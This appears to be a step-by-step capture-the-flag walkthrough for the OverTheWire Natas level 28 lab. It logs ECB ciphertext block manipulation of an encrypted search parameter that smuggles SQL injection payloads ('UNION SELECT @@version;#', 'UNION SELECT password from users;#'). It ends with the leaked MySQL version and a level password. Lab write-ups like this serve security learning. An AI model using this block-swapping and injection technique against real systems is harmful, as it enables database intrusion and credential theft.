+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 36336947ddff073d132c22391e655108
+7 ca8cf4e610913abae39a067619204a5a
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 87527d43773398c6ef1f114a513a0028
+7 75fd5044fd063d26f6bb7f734b41c899
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 c6476e419619d387f457731225f15fe1
+7 6223a14d9c4291b98775b03fbc73d4ed
+8 d8ae51d7da71b2b083d919a0d7b88b98
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 f04dcec4eb6bc17e9a2eea5913bacdf2
+7 4257a343daadaaf2c0e3a1d71ce03dd1
+8 7b7baca655f298a321e90e3f7a60d4d8
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 04255ae16158d15de513cadd2d1c96e2
+7 a773f3185094aa01408f1f97d037d385
+8 678c5773ecc28f870e4f4ebc6c8070a4
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 e3df361c6393619ac7b3e9d097b111ae
+7 a77e8ed1aabe0b5d05c4ffe6ac1423ab
+8 478eb1a1fe261a2c6c15061109b3feda
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 cd699c6cf2fb7e5f43de2106ddb94e62
+7 bdfa1054ec68515cf96f2a5544591947
+8 904f4b2abf2c2d7686aa72a53151c970
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 a7b4895bf7fbb71dc09b3417738fd678
+7 48799a07b1d29b5982015c9355c2e00e
+8 aded9bdbaca6a73b71b35a010d2c4c57
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 870091363eff9125f698cd2ed50bfd28
+7 9a2e2b5db6f31f19a14f75678eadaa90
+8 4249b93e4dea0909479995b9c44b351a
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 e70af0b60e3273f4b79177d59036594c
+7 29287f3cc5479e12e66f31c863b18047
+8 56d5732dc8c770f64397158bc17a6e66
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 ce3c8830216f40eb15999a509b1b6bf2
+7 ac3b871c1c448386b45cd36d9e8f72f4
+8 655149bbba2123d89d95417ea27f3a7b
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 462fecf884b5431f6db8f3d8d6428c00
+7 41c098c4bacdc5ed9357564e5105dd7e
+8 64d0dcc868253692adfcbd3796d1bf8a
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 8e59c7cc6f7a42392748b530014e125f
+7 6486954aea46fb93e9ab85845b4f4bd0
+8 d7ff2b725453fc294701e51f5d7c0f8e
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 85816b43e932247f6976b643b018ca57
+7 896de90884f86108b167f8b4aea5d763
+8 917232051483e68e458fd066167b30a3
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 f560542474c9b06031b5fda36f687acf
+7 a09522f301cf9d36ac7023f165948c5a
+8 9739cd90522fa7a86f95773b56f9f8c0
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 f633e6b05f866226b863817112b1c92b
+7 738a5ffb4a4500246775175ae596bbd6
+8 f34df339c69edce11f6650bbced62702
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 f633e6b05f866226b863817112b1c92b
+7 36336947ddff073d132c22391e655108
+8 ca8cf4e610913abae39a067619204a5a
+
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2
+4 f633e6b05f866226b863817112b1c92b
+5 f633e6b05f866226b863817112b1c92b
+6 f633e6b05f866226b863817112b1c92b
+7 87527d43773398c6ef1f114a513a0028
+8 75fd5044fd063d26f6bb7f734b41c899
+
+*COPY NUMBERED BLOCKS*
+*OPEN NEW WINDOW IN TEXT EDITOR*
+*PASTE NUMBERED BLOCKS AND SAVE AS .TXT FILE
+
+*WEB BROWSER*
+URL: http://natas28.natas.labs.overthewire.org/
+ Whack Computer Joke Database
+Search: AAAAAAAAAA' UNION SELECT @@version;#
+
+URL: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyIFMXypTe9elm0ETDPW2jjqzfZwZ8DYsAqi%2FGIBDFgTasO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
+
+*COPY PARAMETER
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyIFMXypTe9elm0ETDPW2jjqzfZwZ8DYsAqi%2FGIBDFgTasO4ccHESDhrRc022ej3L0ZVFJu7ohI9idlUF%2Bon86ew%3D%3D
+
+*FORK - URL DECODE - FROM BASE64 - HEX - ADD LINE NUMBERS*
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 5f22a727f625419a466f9af53891f9b2  <----------xxxxxxAAAAAAAAAA (TEN A's)
+4 205317ca94def5e966d044c33d6da38e
+5 acdf67067c0d8b00aa2fc62010c58136
+6 ac3b871c1c448386b45cd36d9e8f72f4
+7 655149bbba2123d89d95417ea27f3a7b
+
+*TRY SQL WITH NINE A's*
+URL: http://natas28.natas.labs.overthewire.org/
+ Whack Computer Joke Database
+Search: AAAAAAAAA' UNION SELECT @@version;#
+
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lPmWXqmnze9O%2Fn2%2BK8sqRsa7bpDa90wW3EUnlRUwo07QpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+
+*COPY PARAMETER*
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lPmWXqmnze9O%2Fn2%2BK8sqRsa7bpDa90wW3EUnlRUwo07QpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+
+*FORK - URL DECODE - FROM BASE64 - HEX - ADD LINE NUMBERS*
+1 1be82511a7ba5bfd578c0eef466db59c
+2 dc84728fdcf89d93751d10a7c75c8cf2
+3 16276a702e32b177475d890ddad5ce65  <----------xxxxxxAAAAAAAAA\
+4 3e6597aa69f37bd3bf9f6f8af2ca91b1
+5 aedba436bdd305b71149e5454c28d3b4
+6 29287f3cc5479e12e66f31c863b18047
+7 56d5732dc8c770f64397158bc17a6e66
+
+*COPY NEW NUMBERED BLOCKS*
+*OPEN NEW WINDOW IN TEXT EDITOR*
+*PASTE NUMBERED BLOCKS AND SAVE AS .TXT FILE
+
+*REPLACE THE NINE A's WITH THE TEN A's LINE* 
+*DELETE THE LINE NUMBERS
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+5f22a727f625419a466f9af53891f9b2  <----------xxxxxxxxxxxxAAAAAAAAAA (TEN A's good)
+3e6597aa69f37bd3bf9f6f8af2ca91b1
+aedba436bdd305b71149e5454c28d3b4
+29287f3cc5479e12e66f31c863b18047
+56d5732dc8c770f64397158bc17a6e66
+
+*COPY NEW BLOCKS*
+*SPLIT - LINE FEED - NOTHING*
+*FROM HEX*
+*TO BASE64*
+*URL ENCODE - ENCODE ALL SPECIAL CHARACTERS*
+*NEW PARAMETER*
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyPmWXqmnze9O%2Fn2%2BK8sqRsa7bpDa90wW3EUnlRUwo07QpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+
+*WEB BROWSER*
+*COPY AND PASTE NEW PARAMETER TO URL*
+URL: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyPmWXqmnze9O%2Fn2%2BK8sqRsa7bpDa90wW3EUnlRUwo07QpKH88xUeeEuZvMchjsYBHVtVzLcjHcPZDlxWLwXpuZg%3D%3D
+
+Whack Computer Joke Database
+
+    8.0.37-0ubuntu0.24.04.1
+
+*MYSQL CAN BE INJECTED*
+
+*TOGGLE PREVIOUS PAGE / GO BACK ONE PAGE*
+*TOGGLE PREVIOUS PAGE / GO BACK ONE PAGE*
+URL: http://natas28.natas.labs.overthewire.org/
+ Whack Computer Joke Database
+Search: AAAAAAAAA' UNION SELECT password from users;#
+
+URL: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+Whack Computer Joke Database
+
+*COPY PARAMETER*
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+
+*FORK - SPLIT DELIMITER \N - MERGE DELIMITER \N\N
+*TO HEX - DELIMITER NONE - BYTES PER LINE 16
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+16276a702e32b177475d890ddad5ce65  <---------REMOVE 
+5a73dc8bfa8ab5ed288514e439b17e4f
+86951754f7ad56454eb5d5b6768ee646
+319b9c6dcacb763bd559feccd0293533
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8
+
+*REPLACE THE THIRD BLOCK WITH THE TEN A's LINE*
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+5f22a727f625419a466f9af53891f9b2
+5a73dc8bfa8ab5ed288514e439b17e4f
+86951754f7ad56454eb5d5b6768ee646
+319b9c6dcacb763bd559feccd0293533
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8
+
+*COPY NEW BLOCKS*
+*SPLIT - LINE FEED - NOTHING*
+*FROM HEX*
+*TO BASE64*
+*URL ENCODE - ENCODE ALL SPECIAL CHARACTERS*
+*NEW PARAMETER*
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+
+*WEB BROWSER*
+*COPY AND PASTE NEW PARAMETER TO URL*
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
+
+Whack Computer Joke Database
+
+    31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
